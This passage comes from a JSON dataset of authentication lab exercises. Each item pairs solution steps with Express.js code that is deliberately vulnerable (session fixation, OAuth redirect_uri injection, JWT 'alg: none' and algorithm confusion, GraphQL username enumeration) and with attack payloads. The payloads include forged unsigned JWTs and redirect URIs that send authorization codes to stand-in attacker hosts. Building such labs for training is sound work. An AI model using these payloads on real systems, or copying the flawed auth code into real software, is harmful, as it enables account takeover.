      "Verify the lab is solved by accessing protected content using the fixed session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 's3cr3t' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'sess' + Math.random().toString(36).substr(2); sessions[sid] = username; res.cookie('session', sid); return res.send('Logged in'); } return res.status(403).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username === 'carlos') return res.send('Account: carlos'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session=attacker123 then reuse it on /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth token manipulation via redirect_uri parameter injection",
    "Lab Description": "This OAuth-based authentication flow is vulnerable to a redirect_uri validation flaw. It fails to strictly validate the domain of redirection endpoints, allowing attackers to steal OAuth authorization codes. To solve: Inject a malicious redirect_uri that sends the authorization code to your server, retrieve the stolen code, and use it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy the login process and inspect the OAuth authorization request.",
      "Identify the redirect_uri parameter and test injection using a trusted-looking subdomain (e.g., https://evil.example.com).",
      "Host a listener on your own server (e.g., ngrok) to receive the stolen code.",
      "Craft the full OAuth URL with the manipulated redirect_uri and trick the victim (Carlos) into clicking it.",
      "Capture the authorization code from your listener and exchange it manually at the OAuth provider's /token endpoint using Postman.",
      "Use the access_token in an authenticated request to /my-account to confirm lab success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const validClients = ['app-client-1']; const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); const code = Math.random().toString(36).substr(2); authCodes[code] = 'carlos'; const uri = `${redirect_uri}?code=${code}&state=${state}`; return res.redirect(uri); }); app.post('/token', (req, res) => { const { code } = req.body; if (!authCodes[code]) return res.status(403).send('Invalid code'); const token = 'access-token-' + Math.random().toString(36).substr(2); tokens[token] = authCodes[code]; return res.json({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos Account Accessed'); return res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(OAuth Redirection Lab running on http://localhost:${PORT}));",
    "payloads": [
      "https://oauth.example.com/authorize?client_id=app-client-1&redirect_uri=https://evil.example.com/steal&state=abc123",
      "POST /token with stolen code to get access_token",
      "Authorization: Bearer access-token-xyz123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token verification",
    "Lab Description": "The application verifies user sessions using JSON Web Tokens (JWTs). The JWT validation logic accepts any token using either the HS256 or RS256 algorithm. However, the public key used for RS256 verification is not securely isolated. The application trusts tokens signed with HS256 and validates them using a hardcoded RS256 public key, creating an algorithm confusion vector. To solve: forge a valid token to impersonate Carlos and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept your JWT after logging in.",
      "Validate algorithm type and key handling by sending the token to jwt.io and modifying its header to 'alg':'none' or 'alg':'HS256'.",
      "Craft a new JWT with the header 'alg':'HS256' and payload { 'username': 'carlos' }, then sign it with the public key as a secret.",
      "Inject the modified token into the Authorization header and send a request to /account.",
      "If successful, the page will show Carlos's data. Confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./keys/public.pem'); app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}, Payload: {\"username\":\"carlos\"}, Secret: <RS256 public key as string>",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Unsigned JWT"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth authorization redirect flow",
    "Lab Description": "The application uses OAuth for authentication via a third-party provider. However, the session ID is assigned before user authentication and not regenerated after login. This allows a malicious actor to fix a session ID by luring the victim into authenticating under a session the attacker controls. To solve: log in as Carlos using a fixed session and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the login OAuth redirect request using OWASP ZAP and capture the session cookie.",
      "Send the login link with the fixed session cookie attached to Carlos.",
      "When Carlos logs in via the OAuth provider, the session is updated with his credentials, but the session ID remains the same.",
      "Reuse the fixed session cookie in your browser and visit /account.",
      "Validate that Carlos's data is visible, confirming session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oauthsecret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauth = 'init'; res.redirect('https://provider.com/oauth/authorize?client_id=abc&redirect_uri=http://localhost:3000/callback'); }); app.get('/callback', (req, res) => { req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(3000);",
    "payloads": [
      "Set session cookie before OAuth login: connect.sid=abc123; send link with attached cookie to victim",
      "After victim authenticates, reuse connect.sid=abc123 to access /account"
    ]
  },
  {
    "Lab scenario": "Blind username discovery through GraphQL error differentiation",
    "Lab Description": "The application exposes a GraphQL endpoint that handles authentication queries. Due to a misconfigured error-handling mechanism, responses differ slightly based on the validity of the username during login attempts. This side-channel allows blind enumeration of usernames. To solve: enumerate Carlos's username and use it to brute-force his password to access his profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GraphQL mutation queries with various usernames using Postman.",
      "Use Burp Suite Intruder to automate mutation testing for username values in the loginUser mutation.",
      "Analyze differences in HTTP status codes or error messages for invalid users vs wrong passwords.",
      "After finding Carlos's username, use Burp Intruder again to brute-force the password with fixed username.",
      "Login to the application and access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const users = { carlos: 'hunter2', admin: 'adminpass' }; const schema = buildSchema(` type Query { _: Boolean } type Mutation { loginUser(username: String!, password: String!): String } `); const root = { loginUser: ({ username, password }) => { if (!users[username]) throw new Error('Username not found.'); if (users[username] !== password) throw new Error('Incorrect password'); return 'Login successful'; } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: false })); app.listen(3000);",
    "payloads": [
      "{ \"query\": \"mutation { loginUser(username: \\\"carlos\\\", password: \\\"wrong\\\") }\" }",
      "{ \"query\": \"mutation { loginUser(username: \\\"admin\\\", password: \\\"adminpass\\\") }\" }"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm override in REST API Authentication",
    "Lab Description": "This lab uses JWTs for session management but improperly trusts the 'alg' field in incoming tokens. The application does not validate the token signature if the 'alg' is set to 'none'. The application generates signed JWTs using the HS256 algorithm, but accepts unsigned tokens with 'alg: none'. To solve: forge an unsigned JWT to impersonate Carlos and access their profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT after logging in with your own account.",
      "Send the captured token to Repeater. Decode it using JWT.io or Burp Decoder.",
      "Modify the payload to set 'username': 'carlos' and change 'alg' in the header to 'none'. Remove the signature.",
      "Copy the modified unsigned JWT and set it as the Authorization header using Postman or Burp Repeater.",
      "Send a GET request to /api/profile with the forged token. Verify that Carlos's profile is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'supersecret' }, 'wiener': { password: 'password123' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); return res.json({ token }); } return res.status(403).send('Access denied'); }); app.get('/api/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { return res.send(`Welcome ${decoded.payload.username}`); } try { const verified = jwt.verify(token, 'secretkey'); res.send(`Welcome ${verified.username}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth2 redirect URI manipulation via open redirect in login provider",
    "Lab Description": "This OAuth flow integrates with an external identity provider (IdP), but the application accepts any redirection URI without proper validation. An attacker can manipulate the redirection URI during login to intercept authorization codes and hijack sessions. To solve: abuse the redirection vulnerability to authenticate as Carlos without credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept the OAuth login request initiated by the client to /oauth/start?redirect_uri=...",
      "Observe the redirect_uri parameter and change it to a malicious domain under your control, such as https://evil.com.",
      "Host a listener at https://evil.com to capture the redirected authorization code after login.",
      "Use the captured code to manually construct a token request to the IdP and exchange it for an access token.",
      "Use the obtained token in Authorization headers to call /account/profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/start', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://idp.com/token', { code }); const userInfo = await axios.get('https://idp.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${userInfo.data.username}`); }); app.listen(4000);",
    "payloads": [
      "https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=https://evil.com",
      "Authorization: Bearer <token_exchanged_from_intercepted_code>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session identifier in login flow",
    "Lab Description": "The login system assigns session identifiers before authentication and does not regenerate the session after successful login. An attacker can set a session ID via cookie and trick the victim into authenticating with it. The attacker then hijacks the session. To solve: fixate a session for Carlos and access their account using the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a request to /login while logged out and note the Set-Cookie header for session ID.",
      "Use Postman or Burp to set a fixed session ID manually via Cookie: session=attacker123.",
      "Send Carlos a phishing link or wait until Carlos logs in with the same fixed session ID.",
      "After Carlos logs in, reuse the same session cookie from your end.",
      "Request /account and confirm it now displays Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = { 'carlos': { password: '1234' }, 'admin': { password: 'root' } }; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'sess' + Math.floor(Math.random() * 1000); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[req.cookies.session] = username; return res.send('Login successful'); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome to ${user}'s account`); } else { res.send('Please log in'); } }); app.listen(5000);",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session cookie already set to attacker123 and username=carlos&password=1234"
    ]
  },
  {
    "Lab scenario": "Session Fixation in OAuth Redirect Handler",
    "Lab Description": "The OAuth implementation in this application is vulnerable to session fixation. The redirect URI accepts a pre-set session identifier, which is not regenerated after successful login. The application fails to validate or rotate the session upon authentication. To solve: Hijack Carlos's session by injecting a known session ID during the OAuth redirect phase.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login redirect and examine the session cookie behavior.",
      "Send the intercepted redirect request to Burp Repeater and inject a fixed session ID using Set-Cookie header.",
      "Craft the OAuth callback to include the known session ID in the redirect URL.",
      "Use Postman or curl to access the application with the fixed session after Carlos logs in.",
      "Visit /my-account to verify the hijacked session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/oauth/callback', (req, res) => { const { session, user } = req.query; if (user === 'carlos') { res.cookie('session', session); res.redirect('/my-account'); } else { res.send('Invalid user'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-abc') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /oauth/callback?session=fixed-session-abc&user=carlos",
      "Set-Cookie: session=fixed-session-abc",
      "curl -b 'session=fixed-session-abc' http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Auth Token Verification",
    "Lab Description": "This app validates JWT tokens using a vulnerable library that fails to enforce algorithm constraints. The JWT is signed with 'HS256', but the backend accepts 'none' and skips signature verification. To solve: Forge a token with 'none' algorithm, impersonate Carlos, and access his protected account area.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp during your own login session.",
      "Decode the JWT using jwt.io or Postman and observe the algorithm field.",
      "Modify the JWT header to use 'alg':'none' and change the payload's sub field to carlos.",
      "Remove the signature section completely and replay the token using Burp or curl.",
      "Verify account takeover by accessing /my-account with the forged token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.\" http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "Blind OAuth Token Leakage in Referer Header Injection",
    "Lab Description": "This OAuth flow redirects users to third-party domains after login. However, sensitive tokens are embedded in the Referer header due to improper scope isolation. The application fails to sanitize outbound redirects, leaking Carlos's OAuth token. To solve: Set up a malicious endpoint to intercept tokens and reuse the token to access Carlos’s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in with your own OAuth account and monitor the Referer header using OWASP ZAP.",
      "Observe that the token is embedded in the Referer when redirected to external URLs.",
      "Set up a malicious site (e.g., webhook.site) and inject it as the redirect_uri via manipulated request.",
      "Trigger Carlos’s OAuth login with the crafted redirect_uri and capture the Referer header token.",
      "Replay the captured token using curl or Postman to access Carlos's protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const redirectMap = { 'carlos': 'http://malicious-site.com/steal?token=' }; app.get('/oauth/redirect', (req, res) => { const { user, token } = req.query; const target = redirectMap[user]; if (target) { res.redirect(`${target}${token}`); } else { res.send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'secret-token-carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /oauth/redirect?user=carlos&token=secret-token-carlos",
      "Authorization: Bearer secret-token-carlos",
      "curl -H \"Authorization: Bearer secret-token-carlos\" http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login process",
    "Lab Description": "This lab is vulnerable to session fixation due to improperly handled session tokens. The application issues a session cookie before authentication and continues using it after successful login. To solve the lab, fixate a session for Carlos and access his account after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept initial GET /login request using Burp Suite and capture the issued session cookie.",
      "Send the cookie to the victim via a crafted link (e.g., phishing) or assume it was pre-set by attacker.",
      "Log in using Carlos's credentials while maintaining the fixed session (simulate Carlos using the attacker's session).",
      "Once login is successful, reuse the same session cookie on your browser.",
      "Visit /my-account using the fixed session and confirm account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send(`Account page for ${req.session.username}`); else res.send('Please login'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: connect.sid=attackerSession123",
      "Session reuse after Carlos login",
      "Phishing link: http://victimsite.com/login with preset session"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session token validation",
    "Lab Description": "This lab is vulnerable to JWT signature tampering via `alg: none`. The application fails to properly validate JWT tokens' signature algorithm. To solve the lab, forge a JWT with `alg: none` and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT from your own session using Burp or Postman.",
      "Decode the JWT using jwt.io or a script and observe the header and payload.",
      "Modify the payload to change the username to carlos.",
      "Set the JWT header to `{ \"alg\": \"none\", \"typ\": \"JWT\" }` and remove the signature.",
      "Send the forged JWT in the Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secret123') { const token = jwt.sign({ username }, secret); res.json({ token }); } else res.status(403).send('Forbidden'); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); return res.send(`Welcome ${payload.username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration vulnerability in redirect URI validation",
    "Lab Description": "The lab's OAuth implementation accepts arbitrary redirect URIs due to a flawed validation logic. The application uses OAuth for login but does not strictly validate registered redirect URIs. To solve the lab, obtain an access token for Carlos by injecting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the login flow and intercept the request to /authorize using OWASP ZAP.",
      "Modify the `redirect_uri` parameter to your own malicious domain.",
      "Send the victim a link with this manipulated `redirect_uri` to steal the code.",
      "Capture the `code` parameter via your hosted server.",
      "Exchange the stolen code for an access token using /oauth/token endpoint and impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: false })); const validUsers = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const redirect = redirect_uri;  res.send(`<form method=\"POST\" action=\"/login?redirect=${redirect}\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const redirect = req.query.redirect; if (username === 'carlos' && password === 'oauthpass') { res.redirect(`${redirect}?code=authcode123`); } else { res.send('Login failed'); } }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'token-for-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer token-for-carlos') res.send('Carlos account access granted'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://victim.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback",
      "Stolen code: authcode123",
      "POST /oauth/token with { code: authcode123 }",
      "Authorization: Bearer token-for-carlos"
    ]
  }
]